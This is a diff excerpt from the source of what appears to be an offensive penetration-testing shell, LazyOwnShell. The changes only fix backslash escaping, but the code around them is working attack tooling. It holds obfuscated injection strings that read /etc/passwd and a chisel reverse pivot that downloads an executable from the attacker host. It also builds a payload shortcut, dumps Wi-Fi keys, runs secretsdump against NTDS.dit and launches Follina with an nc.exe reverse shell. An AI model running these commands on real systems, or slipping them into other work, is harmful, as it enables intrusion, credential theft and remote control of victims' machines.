+                    f"p\\\\i\\\n\\\\g",
                     f"cat ${{HOME:0:1}}etc${{HOME:0:1}}passwd",
                     f"cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
                     f"echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
@@ -9525,7 +9530,7 @@ class LazyOwnShell(cmd2.Cmd):
         if len(args) == 1:
             lport = args[0]
             print_msg(
-                f"Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks  to clipboard :D"
+                f"Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\\pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks  to clipboard :D"
             )
             command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile pivot.exe ;"""
             command += " .\\"
@@ -9810,7 +9815,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(f"Asegúrate de que el payload esté en: {payload}")
                 ps_script_content = f"""
                 $WshShell = New-Object -ComObject WScript.Shell
-                $Shortcut = $WshShell.CreateShortcut("c:\Common Applications\Calculator.lnk")
+                $Shortcut = $WshShell.CreateShortcut("c:\\Common Applications\\Calculator.lnk")
                 $Shortcut.TargetPath = "{payload}"
                 $Shortcut.Save()
                 """.replace("                ", "")
@@ -10659,7 +10664,7 @@ class LazyOwnShell(cmd2.Cmd):
         command = '''
         $currentDir = Get-Location
         $networks = netsh wlan show profiles
-        $networkNames = $networks | Select-String -Pattern '(?:Perfil\s*:\s)(.*)' | ForEach-Object { $_.Matches[0].Groups[1].Value }
+        $networkNames = $networks | Select-String -Pattern '(?:Perfil\\s*:\\s)(.*)' | ForEach-Object { $_.Matches[0].Groups[1].Value }
         $results = @()
         foreach ($networkName in $networkNames) {
             $command = 'netsh wlan show profile "' + $networkName + '" key=clear'
@@ -10959,7 +10964,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         if use_tunnel:
             cmd = """
-            link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
+            link=$(grep -o 'https://[-0-9a-z]*\\.trycloudflare.com' "cf.log")
             echo "Cloudflare Tunnel URL: $link"
             """.replace("            ", "")
             os.system(cmd)
@@ -13462,7 +13467,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn("Installing batcat")
             self.cmd("sudo apt install bat -y")
 
-        command = f"curl -s -X GET https://freedns.afraid.org/domain/dnstrace.php\?domain\={domain}\&submit\=Trace | batcat"
+        command = f"curl -s -X GET https://freedns.afraid.org/domain/dnstrace.php\\?domain\\={domain}\\&submit\\=Trace | batcat"
         print_msg(command)
         self.cmd(command)
         return
@@ -14297,7 +14302,7 @@ class LazyOwnShell(cmd2.Cmd):
                         return
             elif line.startswith("system"):
 
-                commands = "cd sessions && secretsdump.py local -system registry/SYSTEM -security registry/SECURITY -ntds Active\ Directory/ntds.dit -outputfile hashes"
+                commands = "cd sessions && secretsdump.py local -system registry/SYSTEM -security registry/SECURITY -ntds Active\\ Directory/ntds.dit -outputfile hashes"
 
                 print_msg(commands)
                 self.cmd(commands)
@@ -19360,7 +19365,7 @@ class LazyOwnShell(cmd2.Cmd):
                 command = f"lookupsid.py {domain}/{user}:{passwd}@{rhost}"
                 print_msg(command)
                 self.cmd(command)
-                self.cmd(f"{command}  | grep 'SidTypeUser' | sed 's/.*\\\ (.*\) (SidTypeUser)/\1/' > usernames.txt")
+                self.cmd(f"{command}  | grep 'SidTypeUser' | sed 's/.*\\\\ (.*\\) (SidTypeUser)/\1/' > usernames.txt")
             return
 
         elif line == "dc-target":
@@ -19774,7 +19779,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif line == "reverse":
             port = input(f"    [!] Enter port for reverse shell (default: {lport}): ") or lport
-            input(f"    {YELLOW}[!] Get a reverse shell on port {lport}. Note, this downloads a netcat binary onto the victim and places it in C:\Windows\Tasks. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled. Press enter when exist:{RESET} ")
+            input(f"    {YELLOW}[!] Get a reverse shell on port {lport}. Note, this downloads a netcat binary onto the victim and places it in C:\\Windows\\Tasks. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled. Press enter when exist:{RESET} ")
 
             command = f"cd {follina_dir} && python3 {follina_dir}/follina.py  --interface  {device} --port {web_port}  -c 'nc.exe -e cmd.exe {self.params['rhost']} {port}'"
             print_msg(f"Executing command: {command}")
@@ -19984,7 +19989,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Example:
             do_rocky('8')
-            # Executes: grep '^.\{8\}$' /usr/share/wordlists/rockyou.txt > sessions/lazypass_mini_rocky.txt
+            # Executes: grep '^.\\{8\\}$' /usr/share/wordlists/rockyou.txt > sessions/lazypass_mini_rocky.txt
         """
         wordlist = self.params["wordlist"]
 
@@ -19995,7 +20000,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("Length must be a positive integer.")
             return
 
-        command = "grep '^.\{" + str(line) + "\}$' " + wordlist + " > sessions/lazypass_mini_rocky.txt"
+        command = "grep '^.\\{" + str(line) + "\\}$' " + wordlist + " > sessions/lazypass_mini_rocky.txt"
         print_msg(command)
         self.cmd(command)
 
@@ -25712,7 +25717,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"[!] {ip}")
         print_msg(f" |_ {name}")
-        print_msg(f" \_ {range}")
+        print_msg(f" \\_ {range}")
         return
 
     @cmd2.with_category(post_exploitation_category)
